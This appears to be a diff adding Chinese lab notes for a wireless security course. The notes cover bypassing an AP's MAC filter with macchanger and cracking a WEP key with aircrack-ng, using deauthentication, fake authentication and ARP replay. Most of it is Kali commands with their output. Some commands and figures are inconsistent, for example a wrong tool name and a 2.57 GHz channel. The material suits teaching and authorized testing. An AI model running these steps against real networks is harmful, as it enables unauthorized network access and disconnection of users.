@@ -1,0 +1,444 @@
+课时62 Mac地址绑定攻击
+
+╋━━━━━━━━━━━╋
+┃   MAC地址绑定攻击    ┃
+╋━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━╋
+┃MAC绑定                           ┃
+┃管理员误以为MAC绑定是一种安全机制 ┃
+┃限制可以关联的客户端MAC地址       ┃
+┃                                  ┃
+┃                                  ┃
+┃准备AP                            ┃
+┃    AP基本配置                    ┃
+┃    Open认证                      ┃
+┃    开启无线过滤                  ┃
+┃修改MAC地址绕过过滤               ┃
+╋━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr 08:00:27:fd:1c:9d
+          inet addr:192.168.20.8  Bcast:192.168.20.255  Mask:255.255.255.0
+          inet6 addr:  fe80::a00:27ff:fefd:1c9d/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST MTU:1500  MetricL:1
+          Rx packets:0 errors:0 dropped:0 overruns:0 frame:0
+          Tx packets:50 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          Rx bytes:1200 (0.0 KiB)   TX bytes:1200 (0.0 KiB)
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1 Mask:255.0.0.0
+          inet addr. ::1/128 Scope:Host
+          UP LOOKBACK RUNNING  MTU:65536 MetricL:1
+          Rx packets:20 errors:0 dropped:0 overruns:0 frame:0
+          Tx packets:20 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          Rx bytes:1200 (1.1 KiB)   TX bytes:1200 (1.1 KiB)
+
+wlan2     Link encap:Ethernet  HWaddr 08:57:00:0c:96:68
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          Rx packets:20 errors:0 dropped:0 overruns:0 frame:0
+          Tx packets:20 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          Rx bytes:0 (0.0 B)   TX bytes:0 (0.0 B)
+
+root@kali:~# service network-manager stop
+
+root@kali:~# airmon-ng check kill
+Killing these processes:
+
+  PID Name
+  718 dnclinet
+  931 wpa_supplicant
+
+root@kali:~# airmon-ng start wlan2
+No interfering processes found
+PHY     Interface       Driver            Chipest
+
+phy0    wlan2           ath9k_htc        Atheros Communications, Inc, AR9271 802.11n
+                (mac80211 monitor mode vif enable for [phy0]wlan2 on [phy0]wlan2mon)
+                (mac80211 station mode vif disabled for [phy0]wlan2)
+
+root@kali:~# iwconfig
+eth0      no wireless extensions
+
+wlan2mon  IEEE 802.11bgn  Mode:Monitor Frequency:2.57 GHz   Tx-Power=20 dBm
+          Retry short limit:7   RTS thr:off    Fragment thr:off
+          Power Management:off
+
+lo        no wireless extensions
+
+root@kali:~# iwlist wlan2mon channel
+wlan2     13 channels in total; avaiable frequencies :
+          Channel 01 : 2.412 GHz
+          Channel 02 : 2.417 GHz
+          Channel 03 : 2.422 GHz
+          Channel 04 : 2.427 GHz
+          Channel 05 : 2.432 GHz
+          Channel 06 : 2.437 GHz
+          Channel 07 : 2.442 GHz
+          Channel 08 : 2.447 GHz
+          Channel 09 : 2.452 GHz
+          Channel 10 : 2.457 GHz
+          Channel 11 : 2.462 GHz
+          Channel 12 : 2.467 GHz
+          Channel 13 : 2.472 GHz
+          Current Frequency:2.457 GHz (Channel 10)
+
+root@kali:~# iw dev wlan2mon set channel 11    //启用11信道
+
+root@kali:~# iwlist wlan2mon channel
+wlan2     13 channels in total; avaiable frequencies :
+          Channel 01 : 2.412 GHz
+          Channel 02 : 2.417 GHz
+          Channel 03 : 2.422 GHz
+          Channel 04 : 2.427 GHz
+          Channel 05 : 2.432 GHz
+          Channel 06 : 2.437 GHz
+          Channel 07 : 2.442 GHz
+          Channel 08 : 2.447 GHz
+          Channel 09 : 2.452 GHz
+          Channel 10 : 2.457 GHz
+          Channel 11 : 2.462 GHz
+          Channel 12 : 2.467 GHz
+          Channel 13 : 2.472 GHz
+          Current Frequency:2.462 GHz (Channel 11)
+
+root@kali:~# airmon-ng wlan2mon          //侦听附近所有的AP和客户
+
+root@kali:~# airmon-ug stop wlan2mon
+
+root@kali:~# airmon-ng start wlan2 11       //直接启用11信道进行监听
+
+root@kali:~# iwlist wlan2mon channel
+wlan2     13 channels in total; avaiable frequencies :
+          Channel 01 : 2.412 GHz
+          Channel 02 : 2.417 GHz
+          Channel 03 : 2.422 GHz
+          Channel 04 : 2.427 GHz
+          Channel 05 : 2.432 GHz
+          Channel 06 : 2.437 GHz
+          Channel 07 : 2.442 GHz
+          Channel 08 : 2.447 GHz
+          Channel 09 : 2.452 GHz
+          Channel 10 : 2.457 GHz
+          Channel 11 : 2.462 GHz
+          Channel 12 : 2.467 GHz
+          Channel 13 : 2.472 GHz
+          Current Frequency:2.462 GHz (Channel 11)
+
+root@kali:~# airodump-ng wlan2mon         //侦听附近所有的AP和客户
+
+------------------------------------------------------------
+
+root@kali:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr 08:00:27:fd:1c:9d
+          inet addr:192.168.20.8  Bcast:192.168.20.255  Mask:255.255.255.0
+          inet6 addr:  fe80::a00:27ff:fefd:1c9d/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST MTU:1500  MetricL:1
+          Rx packets:0 errors:0 dropped:0 overruns:0 frame:0
+          Tx packets:50 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          Rx bytes:1200 (0.0 KiB)   TX bytes:1200 (0.0 KiB)
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1 Mask:255.0.0.0
+          inet addr. ::1/128 Scope:Host
+          UP LOOKBACK RUNNING  MTU:65536 MetricL:1
+          Rx packets:20 errors:0 dropped:0 overruns:0 frame:0
+          Tx packets:20 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          Rx bytes:1200 (1.1 KiB)   TX bytes:1200 (1.1 KiB)
+
+wlan2     Link encap:Ethernet  HWaddr 08:57:00:0c:96:68
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          Rx packets:20 errors:0 dropped:0 overruns:0 frame:0
+          Tx packets:20 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          Rx bytes:0 (0.0 B)   TX bytes:0 (0.0 B)
+
+root@kali:~# airmon-ng start wlan2 11       //直接启用11信道进行监听
+Found 2 processes that could cause trouble.
+If airodump, aireplay-ng or airtun-ng stops working after
+a short period of time, you may want to kill (some of) them!
+
+  PID Name
+ 1944 avahi-deamon
+ 1945 avahi-deamon
+
+PHY     Interface       Driver            Chipest
+
+phy0    wlan2           ath9k_htc        Atheros Communications, Inc, AR9271 802.11n
+                (mac80211 monitor mode vif enable for [phy0]wlan2 on [phy0]wlan2mon)
+                (mac80211 station mode vif disabled for [phy0]wlan2)
+
+root@kali:~# iwconfig
+eth0      no wireless extensions
+
+wlan2mon  IEEE 802.11bgn  Mode:Monitor Frequency:2.57 GHz   Tx-Power=20 dBm
+          Retry short limit:7   RTS thr:off    Fragment thr:off
+          Power Management:off
+
+lo        no wireless extensions
+
+root@kali:~# iwlist wlan2mon channel
+wlan2     13 channels in total; avaiable frequencies :
+          Channel 01 : 2.412 GHz
+          Channel 02 : 2.417 GHz
+          Channel 03 : 2.422 GHz
+          Channel 04 : 2.427 GHz
+          Channel 05 : 2.432 GHz
+          Channel 06 : 2.437 GHz
+          Channel 07 : 2.442 GHz
+          Channel 08 : 2.447 GHz
+          Channel 09 : 2.452 GHz
+          Channel 10 : 2.457 GHz
+          Channel 11 : 2.462 GHz
+          Channel 12 : 2.467 GHz
+          Channel 13 : 2.472 GHz
+          Current Frequency:2.462 GHz (Channel 11)
+
+root@kali:~# airodump-ng wlan2mon -c 11          //侦听信道11附近所有的AP和客户
+
+root@kali:~# airodump-ng wlan2mon -c 11 --bssid EC:26:CA:DC:29:B6
+
+root@kali:~# ifconfig wlan0 down
+
+root@kali:~# macchanger -m 68:3E:34:30:0F:AA wlan0
+Current MAC:   c8:3a:35:ca:46:91 (Tenda Technology Co., Ltd.)
+Permanent MAC: c8:3a:35:ca:46:91 (Tenda Technology Co., Ltd.)
+New MAC:       68:3e:34:30:0f:aa (unknown)
+
+root@kali:~# ifconfig wlan0 up
+
+root@kali:~# ifconfig
+
+root@kali:~# airodump-ng wlan2mon -c 11 --bssid 68:3e:34:30:0f:aa
+
+╋━━━━━━━━━━━╋
+┃       WEP攻击        ┃
+╋━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WEP共享密钥破解                                             ┃
+┃WEP密码破解原理                                             ┃
+┃    IV并非完全随机                                          ┃
+┃    每224个包可能出现一次IV重用                             ┃
+┃   收集大量IV之后找到相同IV及其对应密码文，分析得出共享密码 ┃
+┃ARP回包中包含IV                                             ┃
+┃IV足够多的情况下，任何复杂程度的wep密码都可以被破解         ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# airodump-ng wlan2mon
+
+root@kali:~# airodump-ng -c 11 --bssid EC:26:CA:DC:29:B6 -w wep wlan2mon
+
+╋━━━━━━━━━━━━━━━━╋
+┃WEP共享密钥破解                 ┃
+┃启动monitor模式                 ┃
+┃启动抓包并保存抓包              ┃
+┃Deauthentication抓包XOR文件     ┃
+┃利用XOR文件与AP建立关联         ┃
+┃执行ARP重放                     ┃
+┃Deauthenticiation触发ARP数据包  ┃
+┃收集足够DATA之后破解密码        ┃
+╋━━━━━━━━━━━━━━━━╋
+
+
+root@kali:~# ls
+wep-01.csv    wep-01.kismet.csv    wep-01-EC-26-CA-DC-29-86.xor    wep-01.kisment.netxml
+
+root@kali:~# cat wep-01-EC-26-CA-DC-29-86.xor    //查看的是一个密文
+
+root@kali:~# aireplay-ng --help
+
+  Aireplay-ng 1.2 rc2 - (C) 2006-2014 Thomas d'Otreppe
+  http://www.aircrack-ng.org
+
+  usage: aireplay-ng <options> <replay interface>
+
+  Filter options:
+
+      -b bssid  : MAC address, Access Point
+      -d dmac   : MAC address, Destination
+      -s smac   : MAC address, Source
+      -m len    : minimum packet length
+      -n len    : maximum packet length
+      -u type   : frame control, type    field
+      -v subt   : frame control, subtype field
+      -t tods   : frame control, To      DS bit
+      -f fromds : frame control, From    DS bit
+      -w iswep  : frame control, WEP     bit
+      -D        : disable AP detection
+
+  Replay options:
+
+      -x nbpps  : number of packets per second
+      -p fctrl  : set frame control word (hex)
+      -a bssid  : set Access Point MAC address
+      -c dmac   : set Destination  MAC address
+      -h smac   : set Source       MAC address
+      -g value  : change ring buffer size (default: 8)
+      -F        : choose first matching packet
+
+      Fakeauth attack options:
+
+      -e essid  : set target AP SSID
+      -o npckts : number of packets per burst (0=auto, default: 1)
+      -q sec    : seconds between keep-alives
+      -Q        : send reassociation requests
+      -y prga   : keystream for shared key auth
+      -T n      : exit after retry fake auth request n time
+
+      Arp Replay attack options:
+
+      -j        : inject FromDS packets
+
+      Fragmentation attack options:
+
+      -k IP     : set destination IP in fragments
+      -l IP     : set source IP in fragments
+
+      Test attack options:
+
+      -B        : activates the bitrate test
+
+  Source options:
+
+      -i iface  : capture packets from this interface
+      -r file   : extract packets from this pcap file
+
+  Miscellaneous options:
+
+      -R                    : disable /dev/rtc usage
+      --ignore-negative-one : if the interface's channel can't be determined,
+                              ignore the mismatch, needed for unpatched cfg80211
+
+  Attack modes (numbers can still be used):
+
+      --deauth      count : deauthenticate 1 or all stations (-0)
+      --fakeauth    delay : fake authentication with AP (-1)
+      --interactive       : interactive frame selection (-2)
+      --arpreplay         : standard ARP-request replay (-3)
+      --chopchop          : decrypt/chopchop WEP packet (-4)
+      --fragment          : generates valid keystream   (-5)
+      --caffe-latte       : query a client for new IVs  (-6)
+      --cfrag             : fragments against a client  (-7)
+      --migmode           : attacks WPA migration mode  (-8)
+      --test              : tests injection and quality (-9)
+
+      --help              : Displays this usage screen
+
+
+root@kali:~# aireplay-ng -1 60 -e kifi -y wep-01-EC-26-CA-DC-29-86.xor -a EC:26:CA:DC:29:B6 -h 08-57-00-0C-96-68 wlan2mon   
+//第一种注入方式，每60秒发一次authentication进行身份认证，关联目标wifibSSID，密钥流，AP,本机网卡的manage地址
+21:44:21  Waiting for beacon frame (BSSID: EC:26:CA:DC:29:B6) on channel
+
+21:44:21  Sending Authentication Request (Shared Key) [ACK]
+21:44:21  Authentication 1/2 successful
+21:44:21  Sending encrypted challege. [ACK]
+21:44:21  Authentication 2/2 successful
+21:44:21  Sending Association Request [ACK]
+21:44:21  Association successful :-) (AID: 1)
+
+21:44:36  Sending keep-alive packet [ACK]
+21:44:51  Sending keep-alive packet [ACK]
+21:45:06  Sending Authentication Request (Shared Key) [ACK]
+21:45:21  Authentication 1/2 successful
+21:45:21  Sending encrypted challege. [ACK]
+21:45:21  Authentication 2/2 successful
+21:45:21  Sending Association Request [ACK]
+21:45:21  Association successful :-) (AID: 1)
+
+21:45:36  Sending keep-alive packet [ACK]
+21:45:51  Sending keep-alive packet [ACK]
+21:46:06  Sending keep-alive packet [ACK]
+21:45:06  Sending Authentication Request (Shared Key) [ACK]
+21:47:21  Authentication 1/2 successful
+21:47:21  Sending encrypted challege. [ACK]
+21:47:21  Authentication 2/2 successful
+21:47:21  Sending Association Request [ACK]
+21:47:21  Association successful :-) (AID: 1)
+
+21:47:36  Sending keep-alive packet [ACK]
+
+root@kali:~# aireplay-ng -0 1 -a EC:26:CA:DC:29:B6 -C 68:3E:34:30:0F:AA wlan2mon   //解除关联关系
+21:54:29  Waiting for beacon frame (BSSID: EC:26:CA:DC:29:B6) on channel 11
+21:54:29  Sending 64 directed DeAuth. STMAC: [68:3E:34:30:0F:AA] [ 2|64 ACKs]
+
+root@kali:~# aireplay-ng -0 10 -a EC:26:CA:DC:29:B6 -C 68:3E:34:30:0F:AA wlan2mon
+
+root@kali:~# aireplay-ng -3 -b EC:26:CA:DC:29:B6 -h 08:57:00:0C:96:68 wlan2mon
+21:42:17 Waiting for beacon frame (BSSID: Ec:26:CA:DC:29:B6) on channel 11
+Saving ARP requests in replay_arp-1105-214217.cap
+you shoule also start airodump-ng to capture relies.
+Read 20814 packets (got 0 ARP request and 0 ACKs),sent 0 packets...(0 pps)
+
+root@kali:~# aireplay-ng -0 2 -a EC:26:CA:DC:29:B6 -c 68:3E:34:30:0F:AA wlanmon  //把客户端打掉然后重连
+
+root@kali:~# ls
+wep-01.csv    wep-01.kismet.csv    wep-01-EC-26-CA-DC-29-86.xor    wep-01.kisment.netxml    replay_arp-1105-214217.cap    wep-01.cap
+
+root@kali:~# wireshark wep-01.cap
+
+root@kali:~# aircrack-ng wep-01.cap
+
+                                   Aircrack-ng 1.2 rc2
+
+    KB    depth  bytes(vote)
+     0    0/  2  31(247040) 80(195072) EO(193280) 51(193024) 0A(192000) 4B(190464) 85(190464) BE(190208) 78(189696) EF(189696) 2C(189184)
+     1    1/  2  77(198912) A1(195584) 2F(195816) 95(193024) E6(192512) B5(190976) 1F(189696) 60(189184) AE(188672) 7A(188416) BB(188426)
+     2    8/  2  9B(189184) 3A(188672) D7(188672) EC(188672) 6C(188416) 25(187648) FE(187648) 9A(186880) E4(186880) BB(186624) 27(185856)
+     3    0/  4  A2(240896) 4E(190464) A5(189952) FB(189184) DB(188928) 18(188672) 12(188160) 28(187648) 42(187136) F1(186880) 0E(186624)
+     4   91/  4  E7(178944) 74(178688) AC(178688) 5F(178432) 65(178432) 90(178432) C6(178176) 3E(177920) 42(177920) B7(177920) BA(177920)
+
+       KEY FOUND! [ 31:32:33:34:35:36:37:38:39:30:31:32:33 ] (ASCII: 1234567890123 )
+          Decrypted correctly: 100%
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FAKE AUTHENTICATION                                                         ┃
+┃WEP破解全部需要首先伪造认证，以便于AP进行正常通信                           ┃
+┃不产生ARP数据包                                                             ┃
+┃aireplay-ng -1 0 -e kifi -a <AP MAC> -h <Your MAC> <interface>              ┃
+┃aireplay-ng -1 60 -0 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC><interface>┃
+┃    每60000秒发送reauthenticiation                                          ┃
+┃    -o 1 每次身份认证只发一组认证数据                                       ┃
+┃    -q 10 每10秒发keep-live帧                                               ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃FAKE AUTHENTICATION                     ┃
+┃某些AP验证客户端MAC地址OUI (前三个字节) ┃
+┃MAC地址过滤                             ┃
+┃Denied (Code 1) is WPA in use           ┃
+┃    WPA/WPA2不支持Fake authentication   ┃
+┃使用真实MAC地址                         ┃
+┃物理靠近AP                              ┃
+┃侦听信道正确                            ┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃FAKE AUTHENTICATION排错                 ┃
+┃物理足够接近被攻击者                    ┃
+┃与被攻击者使用相同无线标准b、n、g       ┃
+┃客户端可能拒绝广播帧，建议制定客户端    ┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃ARP重放                                                   ┃
+┃侦听正常的ARP包并重放给AP                                 ┃
+┃AP回包中包含大量弱IV                                      ┃
+┃                                                          ┃
+┃                                                          ┃
+┃aireplay-ng -3 -b <AP MAC> -h <Source MAC><interface name>┃
+┃    -h合法客户端/供给者MAC                                ┃
+┃Airodump-ng data字段                                      ┃
+┃    64bit密钥: 25万                                       ┃
+┃    128bit密钥: 150万                                     ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━╋
+┃WEP破解               ┃
+┃Airecrack-ng wep.cap  ┃
+╋━━━━━━━━━━━╋
